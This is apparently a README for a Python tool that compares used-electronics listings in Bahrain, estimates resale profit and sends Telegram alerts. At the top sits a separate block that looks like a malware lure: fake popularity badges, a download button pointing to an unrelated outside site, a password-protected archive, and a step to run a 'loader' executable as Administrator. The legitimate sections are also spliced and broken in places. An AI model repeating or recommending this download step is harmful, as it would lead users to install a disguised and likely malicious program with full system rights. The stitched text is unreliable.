<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Bahrain Flip Finder

I built this tool to help me compare used-electronics listings in Bahrain. It reads
public listing pages, groups similar products and works out whether the price leaves
enough room for resale after transport, repairs and selling costs.

The price calculation is regular Python code. AI review is optional and is mainly used
to check the product model, missing information and obvious risks.

## How it works

The scan follows the same path for every listing:

```mermaid
flowchart TD
    A["Public listing pages"] --> B["Collect and normalize listings"]
    B --> C["Remove duplicates"]
    C --> D["Match the exact model or category"]
    D --> E["Filter price outliers and find the median"]
    E --> F["Calculate cost, profit, ROI and maximum buy price"]
    F --> G{"Meets the configured thresholds?"}
    G -- "No" --> H["Skip and save the result"]
    G -- "Yes" --> I["Optional AI risk review"]
    I --> J["Send the opportunity to Telegram"]
```

## What it does

- Reads public OpenSooq and Dubizzle listing pages.
- Extracts the title, price, condition, link and available images.
- Removes repeated listings.
- Matches the same model first, then falls back to products in the same category.
- Uses median prices and an IQR filter to reduce the effect of unusual asking prices.
- Calculates expected sale price, total cost, profit, ROI and maximum buying price.
- Saves processed listings and retry state in SQLite.
- Can review a result with Cloud5/TaBiToken or DeepSeek.
- Sends matching opportunities to Telegram.
- Runs once from the command line or continuously in watch mode.

## Price calculation

For each listing, the program finds nearby matches and prefers exact model numbers.
When there are enough prices, it removes large outliers and takes the median of the
remaining listings. It then applies `SALE_REALIZATION_RATE` because an asking price is
not necessarily the final selling price.

```text
total cost = listing price + transport + repair reserve + selling fees
profit = expected sale price - total cost
ROI = profit / total cost * 100
maximum buy = expected sale price - other costs - target profit
```

An item only passes when it meets the configured profit, ROI, confidence and comparable
count. AI cannot turn a failed price calculation into a buying candidate.

## Setup

Python 3.10 or newer is required.

```bash
## Commands

Run one scan using local price checks:

```bash
python -m flip_finder scan
```

Fetch public detail pages and use AI review:

```bash
python -m flip_finder scan --details --ai
```

Send accepted results to Telegram:

```bash
python -m flip_finder scan --details --ai --telegram
```

Start watch mode with a 30-minute interval:

```bash
python -m flip_finder scan --details --ai --telegram --watch --interval 1800
```

Other useful commands:

```bash
python -m flip_finder scan --bootstrap
python -m flip_finder doctor
python -m flip_finder test-ai
python -m flip_finder test-telegram
```

## AI keys

Providers are tried in the order set by `AI_PROVIDER_ORDER`. Keys are used one at a
time. If a key is invalid, rate-limited or temporarily unavailable, it is put on
cooldown before the next key is tried. If none of that provider's keys work, the scan
moves to the next provider.

```dotenv
AI_PROVIDER_ORDER=cloud5,deepseek

CLOUD5_API_KEY_1=
CLOUD5_API_KEY_2=
## Files

| Path | Purpose |
| --- | --- |
| `src/flip_finder/collectors.py` | Public page requests and listing parsing |
| `src/flip_finder/pricing.py` | Matching, price filtering and profit calculations |
| `src/flip_finder/ai/providers.py` | Cloud5 and DeepSeek fallback |
| `src/flip_finder/storage.py` | SQLite state |
| `src/flip_finder/telegram.py` | Alert formatting and sending |
| `src/flip_finder/cli.py` | Commands and scan flow |
| `data/catalog_terms.json` | Categories and Arabic/English matching terms |
| `tests/` | Offline tests for the main logic |

## Tests

The tests do not contact listing sites, Telegram or paid APIs.

```bash
python -m pip install -e ".[dev]"
pytest
```

## Notes

- Listing prices are asking prices, not completed sales.
- Product condition still needs to be checked in person.
- Source sites can change their HTML, so parsers may need updates.
- The collector does not use private APIs or bypass login and CAPTCHA pages.

## License

MIT


---

MIT License

Copyright (c) 2026 Awab Al-Muaalemi

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
